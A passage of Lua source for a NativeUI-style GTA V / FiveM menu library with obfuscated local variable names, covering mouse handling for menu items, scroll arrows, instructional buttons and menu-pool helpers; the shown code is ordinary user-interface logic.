                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:GoLeft()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:GoRight()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                elseif xbZwq == "UIMenuSliderItem" then
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:GoLeft()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:GoRight()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                elseif xbZwq == "UIMenuSliderProgressItem" then
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:GoLeft()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:GoRight()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                elseif xbZwq == "UIMenuSliderHeritageItem" then
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:GoLeft()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                            eM5sVOtp55zHPbUWoa.RightArrow.Height
                                        )
                                     then
                                        self:GoRight()
                                    elseif
                                        not IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                            eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                        )
                                     then
                                        self:SelectItem()
                                    end
                                elseif xbZwq == "UIMenuProgressItem" then
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.Bar.X + mUkQWEYL4.X,
                                            eM5sVOtp55zHPbUWoa.Bar.Y + mUkQWEYL4.Y - 12,
                                            eM5sVOtp55zHPbUWoa.Data.Max,
                                            eM5sVOtp55zHPbUWoa.Bar.Height + 24
                                        )
                                     then
                                        eM5sVOtp55zHPbUWoa:CalculateProgress(
                                            math.round(GetControlNormal(0, 239) * 1920) - mUkQWEYL4.X
                                        )
                                        self.OnProgressChange(self, eM5sVOtp55zHPbUWoa, eM5sVOtp55zHPbUWoa.Data.Index)
                                        eM5sVOtp55zHPbUWoa.OnProgressChanged(
                                            self,
                                            eM5sVOtp55zHPbUWoa,
                                            eM5sVOtp55zHPbUWoa.Data.Index
                                        )
                                        if not eM5sVOtp55zHPbUWoa.Pressed then
                                            eM5sVOtp55zHPbUWoa.Pressed = true
                                            Citizen.CreateThread(
                                                function()
                                                    eM5sVOtp55zHPbUWoa.Audio.Id = GetSoundId()
                                                    PlaySoundFrontend(
                                                        eM5sVOtp55zHPbUWoa.Audio.Id,
                                                        eM5sVOtp55zHPbUWoa.Audio.Slider,
                                                        eM5sVOtp55zHPbUWoa.Audio.Library,
                                                        1
                                                    )
                                                    Citizen.Wait(100)
                                                    StopSound(eM5sVOtp55zHPbUWoa.Audio.Id)
                                                    ReleaseSoundId(eM5sVOtp55zHPbUWoa.Audio.Id)
                                                    eM5sVOtp55zHPbUWoa.Pressed = false
                                                end
                                            )
                                        end
                                    else
                                        self:SelectItem()
                                    end
                                else
                                    self:SelectItem()
                                end
                            elseif not eM5sVOtp55zHPbUWoa:Selected() then
                                self:CurrentSelection(i - 1)
                                PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
                                self.OnIndexChange(self, self:CurrentSelection())
                                self.ReDraw = true
                                self:UpdateScaleform()
                            elseif not eM5sVOtp55zHPbUWoa:Enabled() and eM5sVOtp55zHPbUWoa:Selected() then
                                PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
                            end
                            Citizen.Wait(175)
                            while IsDisabledControlPressed(0, 24) and
                                IsMouseInBounds(MeTEwoGzMOw, sMsHT, mnCjb22ljXKJsnQP5Czwe, Acjc6bIf9W6) do
                                if eM5sVOtp55zHPbUWoa:Selected() and eM5sVOtp55zHPbUWoa:Enabled() then
                                    if xbZwq == "UIMenuListItem" then
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                            )
                                         then
                                            self:GoLeft()
                                        end
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Height
                                            )
                                         then
                                            self:GoRight()
                                        end
                                    elseif xbZwq == "UIMenuSliderItem" then
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                            )
                                         then
                                            self:GoLeft()
                                        end
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Height
                                            )
                                         then
                                            self:GoRight()
                                        end
                                    elseif xbZwq == "UIMenuSliderProgressItem" then
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                            )
                                         then
                                            self:GoLeft()
                                        end
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Height
                                            )
                                         then
                                            self:GoRight()
                                        end
                                    elseif xbZwq == "UIMenuSliderHeritageItem" then
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Width,
                                                eM5sVOtp55zHPbUWoa.LeftArrow.Height
                                            )
                                         then
                                            self:GoLeft()
                                        end
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.RightArrow.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Y + mUkQWEYL4.Y,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Width,
                                                eM5sVOtp55zHPbUWoa.RightArrow.Height
                                            )
                                         then
                                            self:GoRight()
                                        end
                                    elseif xbZwq == "UIMenuProgressItem" then
                                        if
                                            IsMouseInBounds(
                                                eM5sVOtp55zHPbUWoa.Bar.X + mUkQWEYL4.X,
                                                eM5sVOtp55zHPbUWoa.Bar.Y + mUkQWEYL4.Y - 12,
                                                eM5sVOtp55zHPbUWoa.Data.Max,
                                                eM5sVOtp55zHPbUWoa.Bar.Height + 24
                                            )
                                         then
                                            eM5sVOtp55zHPbUWoa:CalculateProgress(
                                                math.round(GetControlNormal(0, 239) * 1920) - mUkQWEYL4.X
                                            )
                                            self.OnProgressChange(
                                                self,
                                                eM5sVOtp55zHPbUWoa,
                                                eM5sVOtp55zHPbUWoa.Data.Index
                                            )
                                            eM5sVOtp55zHPbUWoa.OnProgressChanged(
                                                self,
                                                eM5sVOtp55zHPbUWoa,
                                                eM5sVOtp55zHPbUWoa.Data.Index
                                            )
                                            if not eM5sVOtp55zHPbUWoa.Pressed then
                                                eM5sVOtp55zHPbUWoa.Pressed = true
                                                Citizen.CreateThread(
                                                    function()
                                                        eM5sVOtp55zHPbUWoa.Audio.Id = GetSoundId()
                                                        PlaySoundFrontend(
                                                            eM5sVOtp55zHPbUWoa.Audio.Id,
                                                            eM5sVOtp55zHPbUWoa.Audio.Slider,
                                                            eM5sVOtp55zHPbUWoa.Audio.Library,
                                                            1
                                                        )
                                                        Citizen.Wait(100)
                                                        StopSound(eM5sVOtp55zHPbUWoa.Audio.Id)
                                                        ReleaseSoundId(eM5sVOtp55zHPbUWoa.Audio.Id)
                                                        eM5sVOtp55zHPbUWoa.Pressed = false
                                                    end
                                                )
                                            end
                                        else
                                            self:SelectItem()
                                        end
                                    end
                                elseif not eM5sVOtp55zHPbUWoa:Selected() then
                                    self:CurrentSelection(i - 1)
                                    PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
                                    self.OnIndexChange(self, self:CurrentSelection())
                                    self.ReDraw = true
                                    self:UpdateScaleform()
                                elseif not eM5sVOtp55zHPbUWoa:Enabled() and eM5sVOtp55zHPbUWoa:Selected() then
                                    PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
                                end
                                Citizen.Wait(125)
                            end
                            self.Controls.MousePressed = false
                        end
                    )
                end
            end
        else
            eM5sVOtp55zHPbUWoa:Hovered(false)
        end
        UGfNDSUmsB2 = UGfNDSUmsB2 + self:CalculateItemHeightOffset(eM5sVOtp55zHPbUWoa)
    end
    local nc, dBZ51i =
        self.Position.X + mUkQWEYL4.X,
        144 + self:CalculateItemHeight() + self.Position.Y + mUkQWEYL4.Y + _aZ9mNDi1tkwLqoSFWK
    if #self.Items <= self.Pagination.Total + 1 then
        return
    end
    if IsMouseInBounds(nc, dBZ51i, 431 + self.WidthOffset, 18) then
        self.Extra.Up:Colour(30, 30, 30, 255)
        if not self.Controls.MousePressed then
            if IsDisabledControlJustPressed(0, 24) then
                Citizen.CreateThread(
                    function()
                        local rFALfkD9W4C6bdSakwK, Xv3JwId8trTroZ = nc, dBZ51i
                        self.Controls.MousePressed = true
                        if #self.Items > self.Pagination.Total + 1 then
                            self:GoUpOverflow()
                        else
                            self:GoUp()
                        end
                        Citizen.Wait(175)
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(rFALfkD9W4C6bdSakwK, Xv3JwId8trTroZ, 431 + self.WidthOffset, 18) do
                            if #self.Items > self.Pagination.Total + 1 then
                                self:GoUpOverflow()
                            else
                                self:GoUp()
                            end
                            Citizen.Wait(125)
                        end
                        self.Controls.MousePressed = false
                    end
                )
            end
        end
    else
        self.Extra.Up:Colour(0, 0, 0, 200)
    end
    if IsMouseInBounds(nc, dBZ51i + 18, 431 + self.WidthOffset, 18) then
        self.Extra.Down:Colour(30, 30, 30, 255)
        if not self.Controls.MousePressed then
            if IsDisabledControlJustPressed(0, 24) then
                Citizen.CreateThread(
                    function()
                        local TkrqUZ9eQuhJlDCWcyO, nKhD_n53MI8zMtQOXp = nc, dBZ51i
                        self.Controls.MousePressed = true
                        if #self.Items > self.Pagination.Total + 1 then
                            self:GoDownOverflow()
                        else
                            self:GoDown()
                        end
                        Citizen.Wait(175)
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(TkrqUZ9eQuhJlDCWcyO, nKhD_n53MI8zMtQOXp + 18, 431 + self.WidthOffset, 18) do
                            if #self.Items > self.Pagination.Total + 1 then
                                self:GoDownOverflow()
                            else
                                self:GoDown()
                            end
                            Citizen.Wait(125)
                        end
                        self.Controls.MousePressed = false
                    end
                )
            end
        end
    else
        self.Extra.Down:Colour(0, 0, 0, 200)
    end
end
function UIMenu:AddInstructionButton(CK4Fdk9UAInbJMI)
    if type(CK4Fdk9UAInbJMI) == "table" and #CK4Fdk9UAInbJMI == 2 then
        table.insert(self.InstructionalButtons, CK4Fdk9UAInbJMI)
    end
end
function UIMenu:RemoveInstructionButton(r9TGQ)
    if type(r9TGQ) == "table" then
        for i = 1, #self.InstructionalButtons do
            if r9TGQ == self.InstructionalButtons[i] then
                table.remove(self.InstructionalButtons, i)
                break
            end
        end
    else
        if tonumber(r9TGQ) then
            if self.InstructionalButtons[tonumber(r9TGQ)] then
                table.remove(self.InstructionalButtons, tonumber(r9TGQ))
            end
        end
    end
end
function UIMenu:AddEnabledControl(k71cEJNcsbe6y9I2, g_CG6eZW6, xZp)
    if tonumber(k71cEJNcsbe6y9I2) and tonumber(g_CG6eZW6) then
        table.insert(self.Settings.EnabledControls[(xZp and "Controller" or "Keyboard")], {k71cEJNcsbe6y9I2, g_CG6eZW6})
    end
end
function UIMenu:RemoveEnabledControl(A747v6j, XnaFnstRmbmZB, RtyoETr)
    local ZlsAUVgft = (RtyoETr and "Controller" or "Keyboard")
    for Index = 1, #self.Settings.EnabledControls[ZlsAUVgft] do
        if
            A747v6j == self.Settings.EnabledControls[ZlsAUVgft][Index][1] and
                XnaFnstRmbmZB == self.Settings.EnabledControls[ZlsAUVgft][Index][2]
         then
            table.remove(self.Settings.EnabledControls[ZlsAUVgft], Index)
            break
        end
    end
end
function UIMenu:UpdateScaleform()
    if not self._Visible or not self.Settings.InstructionalButtons then
        return
    end
    PushScaleformMovieFunction(self.InstructionalScaleform, "CLEAR_ALL")
    PopScaleformMovieFunction()
    PushScaleformMovieFunction(self.InstructionalScaleform, "TOGGLE_MOUSE_BUTTONS")
    PushScaleformMovieFunctionParameterInt(0)
    PopScaleformMovieFunction()
    PushScaleformMovieFunction(self.InstructionalScaleform, "CREATE_CONTAINER")
    PopScaleformMovieFunction()
    PushScaleformMovieFunction(self.InstructionalScaleform, "SET_DATA_SLOT")
    PushScaleformMovieFunctionParameterInt(0)
    PushScaleformMovieFunctionParameterString(GetControlInstructionalButton(2, 176, 0))
    PushScaleformMovieFunctionParameterString(GetLabelText("HUD_INPUT2"))
    PopScaleformMovieFunction()
    if self.Controls.Back.Enabled then
        PushScaleformMovieFunction(self.InstructionalScaleform, "SET_DATA_SLOT")
        PushScaleformMovieFunctionParameterInt(1)
        PushScaleformMovieFunctionParameterString(GetControlInstructionalButton(2, 177, 0))
        PushScaleformMovieFunctionParameterString(GetLabelText("HUD_INPUT3"))
        PopScaleformMovieFunction()
    end
    local Xxe = 2
    for i = 1, #self.InstructionalButtons do
        if self.InstructionalButtons[i] then
            if #self.InstructionalButtons[i] == 2 then
                PushScaleformMovieFunction(self.InstructionalScaleform, "SET_DATA_SLOT")
                PushScaleformMovieFunctionParameterInt(Xxe)
                PushScaleformMovieFunctionParameterString(self.InstructionalButtons[i][1])
                PushScaleformMovieFunctionParameterString(self.InstructionalButtons[i][2])
                PopScaleformMovieFunction()
                Xxe = Xxe + 1
            end
        end
    end
    PushScaleformMovieFunction(self.InstructionalScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
    PushScaleformMovieFunctionParameterInt(-1)
    PopScaleformMovieFunction()
end
MenuPool = setmetatable({}, MenuPool)
MenuPool.__index = MenuPool
function MenuPool.New()
    local AbBneo7z7a = {Menus = {}}
    return setmetatable(AbBneo7z7a, MenuPool)
end
function MenuPool:AddSubMenu(ZWSjBCvoB, bef, JuWv, b0kAibtODshn9Ezqpbyt, pOMECnPfq9DQBv0m, DCEprbnIvobVI90, bRY5lFjORuR)
    if ZWSjBCvoB() == "UIMenu" then
        local Nx0ExpypTU4xIRFfcnEk = UIMenuItem.New(tostring(bef), JuWv or "")
        ZWSjBCvoB:AddItem(Nx0ExpypTU4xIRFfcnEk)
        local MgoMVsrZPuKDWNt93j
        if DCEprbnIvobVI90 == nil or DCEprbnIvobVI90 == "" then
            DCEprbnIvobVI90 = "~r~Developers: csharp#4925 discord.gg/x8ySQcp"
        end
        if b0kAibtODshn9Ezqpbyt then
            MgoMVsrZPuKDWNt93j =
                UIMenu.New(ZWSjBCvoB.Title:Text(), DCEprbnIvobVI90, ZWSjBCvoB.Position.X, ZWSjBCvoB.Position.Y)
        else
            MgoMVsrZPuKDWNt93j = UIMenu.New(ZWSjBCvoB.Title:Text(), DCEprbnIvobVI90)
        end
        if pOMECnPfq9DQBv0m then
            if ZWSjBCvoB.Logo ~= nil then
                MgoMVsrZPuKDWNt93j.Logo = ZWSjBCvoB.Logo
            else
                MgoMVsrZPuKDWNt93j.Logo = nil
                MgoMVsrZPuKDWNt93j.Banner = ZWSjBCvoB.Banner
            end
        end
        if bRY5lFjORuR then
            Nx0ExpypTU4xIRFfcnEk:SetRightBadge(bRY5lFjORuR)
        end
        self:Add(MgoMVsrZPuKDWNt93j)
        ZWSjBCvoB:BindMenuToItem(MgoMVsrZPuKDWNt93j, Nx0ExpypTU4xIRFfcnEk)
        return {SubMenu = MgoMVsrZPuKDWNt93j, Item = Nx0ExpypTU4xIRFfcnEk}
    end
end
function MenuPool:Add(dK2NyQx)
    if dK2NyQx() == "UIMenu" then
        table.insert(self.Menus, dK2NyQx)
    end
end
function MenuPool:MouseEdgeEnabled(Oa7dqT)
    if Oa7dqT ~= nil then
        for gXsxO1Rb, hs2 in pairs(self.Menus) do
            hs2.Settings.MouseEdgeEnabled = tobool(Oa7dqT)
        end
    end
end
function MenuPool:ControlDisablingEnabled(FWeZMEvWBDXGc)
    if FWeZMEvWBDXGc ~= nil then
        for elV2iG, oOJpmBdtfnwy in pairs(self.Menus) do
            oOJpmBdtfnwy.Settings.ControlDisablingEnabled = tobool(FWeZMEvWBDXGc)
        end
    end
end
function MenuPool:ResetCursorOnOpen(LWn)
    if LWn ~= nil then
        for F8WW9Og, ZIP6Y in pairs(self.Menus) do
            ZIP6Y.Settings.ResetCursorOnOpen = tobool(LWn)
        end
    end
end
function MenuPool:MultilineFormats(IXvVIdvmKRUpy6vcG7j5i)
    if IXvVIdvmKRUpy6vcG7j5i ~= nil then
        for tUjCwtwjp_DfUB8, en1PGuYqpJz in pairs(self.Menus) do
            en1PGuYqpJz.Settings.MultilineFormats = tobool(IXvVIdvmKRUpy6vcG7j5i)
        end
    end
end
function MenuPool:Audio(JWzloSh_P, H8AQrLYfC9SAn)
    if JWzloSh_P ~= nil and H8AQrLYfC9SAn ~= nil then
        for LhpD, klf4_ in pairs(self.Menus) do
            if klf4_.Settings.Audio[JWzloSh_P] then
                klf4_.Settings.Audio[JWzloSh_P] = H8AQrLYfC9SAn
            end
        end
    end
end
function MenuPool:WidthOffset(SjM7CUl_jY)
    if tonumber(SjM7CUl_jY) then
        for GAH7GD, ZEJBjQJqU in pairs(self.Menus) do
            ZEJBjQJqU:SetMenuWidthOffset(tonumber(SjM7CUl_jY))
        end
    end
end
function MenuPool:CounterPreText(X4ZMS0fUuoc)
    if X4ZMS0fUuoc ~= nil then
        for IkOHXkBeTs_xk8jLK9eQ, Mbtu2b3SXgG48Qr in pairs(self.Menus) do
            Mbtu2b3SXgG48Qr.PageCounter.PreText = tostring(X4ZMS0fUuoc)
        end
    end
end
function MenuPool:DisableInstructionalButtons(WilOmxXJePEofjj)
    if WilOmxXJePEofjj ~= nil then
        for VE, CBrMZcydAtDFhgV7l in pairs(self.Menus) do
            CBrMZcydAtDFhgV7l.Settings.InstructionalButtons = tobool(WilOmxXJePEofjj)
        end
    end
end
function MenuPool:MouseControlsEnabled(BpZ8SdT)
    if BpZ8SdT ~= nil then
        for dkJqG7ExCWQa9vEi8R, lH in pairs(self.Menus) do
            lH.Settings.MouseControlsEnabled = tobool(BpZ8SdT)
        end
    end
end
function MenuPool:RefreshIndex()
    for lLlw6, IVvCdPf7k5D in pairs(self.Menus) do
        IVvCdPf7k5D:RefreshIndex()
    end
end
function MenuPool:ProcessMenus()
    self:ProcessControl()
    self:ProcessMouse()
    self:Draw()
end
function MenuPool:ProcessControl()
    for nllUjewM_, c8ck in pairs(self.Menus) do
        if c8ck:Visible() then
            c8ck:ProcessControl()
        end
    end
end
function MenuPool:ProcessMouse()
    for UJyOtKQ6D2CA, IxWzurZCYRglsIo in pairs(self.Menus) do
        if IxWzurZCYRglsIo:Visible() then
            IxWzurZCYRglsIo:ProcessMouse()
        end
    end
end
function MenuPool:Draw()
    for l_zPjigs0faBqK6GKu, w in pairs(self.Menus) do
        if w:Visible() then
            w:Draw()
        end
    end
end
function MenuPool:IsAnyMenuOpen()
    local wCp1Up = false
    for VLQBc4ICs4SU, Qb4iq9K3WR7s in pairs(self.Menus) do
        if Qb4iq9K3WR7s:Visible() then
            wCp1Up = true
            break
        end
    end
    return wCp1Up
end
function MenuPool:CloseAllMenus()
    for l, Lfnicz6fnyF in pairs(self.Menus) do
        if Lfnicz6fnyF:Visible() then
            Lfnicz6fnyF:Visible(false)
            Lfnicz6fnyF.OnMenuClosed(Lfnicz6fnyF)
        end
    end
end
function MenuPool:SetBannerSprite(yf99X9HO2fjZU4Qls2)
    if yf99X9HO2fjZU4Qls2() == "Sprite" then
        for B4erFdi2xOq0n5Fws, wrHASzmAi7 in pairs(self.Menus) do
            wrHASzmAi7:SetBannerSprite(yf99X9HO2fjZU4Qls2)
        end
    end
end
function MenuPool:SetBannerRectangle(N7_DreT)
    if N7_DreT() == "Rectangle" then
        for HxjqupQgYBVA, IRhyYCQfC_7n in pairs(self.Menus) do
            IRhyYCQfC_7n:SetBannerRectangle(N7_DreT)
        end
    end
end
function MenuPool:TotalItemsPerPage(MCPFFXTdBXB2dIfu)
    if tonumber(MCPFFXTdBXB2dIfu) then
        for vw, s8T9141mofuh in pairs(self.Menus) do
            s8T9141mofuh.Pagination.Total = MCPFFXTdBXB2dIfu - 1
        end
    end
end
function MenuPool:Remove()
    self = nil
end
NativeUI = {}
function NativeUI.CreatePool()
    return MenuPool.New()
end
function NativeUI.CreateMenu(
    WrCCO0GbmmZXtTya_,
    GCDJ0UHdq2y0QW4ge_m,
    G2Yl4AL8cxzDNnkln,
    Kdsrd5mMvoDQx,
    QRTYfBB,
    RwcN0,
    PxjOXIA8hIcLCs,
    Fk,
    NDyBd9m,
    KkzzMkFiA,
    u2w1IgYGLJBR)
    return UIMenu.New(
        WrCCO0GbmmZXtTya_,
        GCDJ0UHdq2y0QW4ge_m,
        G2Yl4AL8cxzDNnkln,
        Kdsrd5mMvoDQx,
        NDyBd9m,
        KkzzMkFiA,
        u2w1IgYGLJBR,
        165,
        165,
        165,
        Fk
    )
end
function NativeUI.CreateItem(Hs, eAE6EmJrFdCIX0zAUtI)
    return UIMenuItem.New(Hs, eAE6EmJrFdCIX0zAUtI)
end
function NativeUI.CreateColouredItem(wjpI, YJ, WVE, j_3YabBglwp)
    return UIMenuColouredItem.New(wjpI, YJ, WVE, j_3YabBglwp)
end
function NativeUI.CreateCheckboxItem(jJTdcP1Z, YyLQfz4t, TmrqVGcjnD, m3H0hpM5cZMuCxyRI)
    return UIMenuCheckboxItem.New(jJTdcP1Z, YyLQfz4t, TmrqVGcjnD, m3H0hpM5cZMuCxyRI)
end
function NativeUI.CreateListItem(rJPwKkkdWq1, UXJItOpRQ2bF, mDg3RL, yypS0oaEEGF)
    return UIMenuListItem.New(rJPwKkkdWq1, UXJItOpRQ2bF, mDg3RL, yypS0oaEEGF)
end
function NativeUI.CreateSliderItem(
    wX6OI9a6lkqL,
    QaI0jjzpuoCF,
    jav0ohwrjnzEmUp7y,
    JznkbUD1J0,
    BgX,
    Ckx3h4WcRnTmR4ttUSlkW,
    i_4QnvABC8A_3BL)
    return UIMenuSliderItem.New(
        wX6OI9a6lkqL,
        QaI0jjzpuoCF,
        jav0ohwrjnzEmUp7y,
        JznkbUD1J0,
        BgX,
        Ckx3h4WcRnTmR4ttUSlkW,
        i_4QnvABC8A_3BL
    )
end
function NativeUI.CreateSliderHeritageItem(_w, sPnx_kur5YX4KL7_, ISn3, wjdQB_SB, V1k, WYqMKXuMJ6fjd8i)
    return UIMenuSliderHeritageItem.New(_w, sPnx_kur5YX4KL7_, ISn3, wjdQB_SB, V1k, WYqMKXuMJ6fjd8i)
end
function NativeUI.CreateSliderProgressItem(qYMKaGYVYVkO6XW48, gkw8rMgOKlqkszqLC81y, HXnIhZXV7IBcS2ZcWA6wG, If9, rMCyw, U)
    return UIMenuSliderProgressItem.New(qYMKaGYVYVkO6XW48, gkw8rMgOKlqkszqLC81y, HXnIhZXV7IBcS2ZcWA6wG, If9, rMCyw, U)
end
function NativeUI.CreateProgressItem(BIgC_, jL_e7izyAMfDh6ocik0, q, YXrndooIngjUrLZMyI, zPqt5zk2MILJ)
    return UIMenuProgressItem.New(BIgC_, jL_e7izyAMfDh6ocik0, q, YXrndooIngjUrLZMyI, zPqt5zk2MILJ)
end
function NativeUI.CreateHeritageWindow(A8NXsPNbTm, IWXXimLKJhzAGwRp)
    return UIMenuHeritageWindow.New(A8NXsPNbTm, IWXXimLKJhzAGwRp)
end
function NativeUI.CreateGridPanel(NF7L8VYrSw1y, Lg3jNc, b0bcfydYMLNahug9_, USraKtXXrbbI9zNr2cZ9z, lxJfY, A1lOj0JRs7ipU)
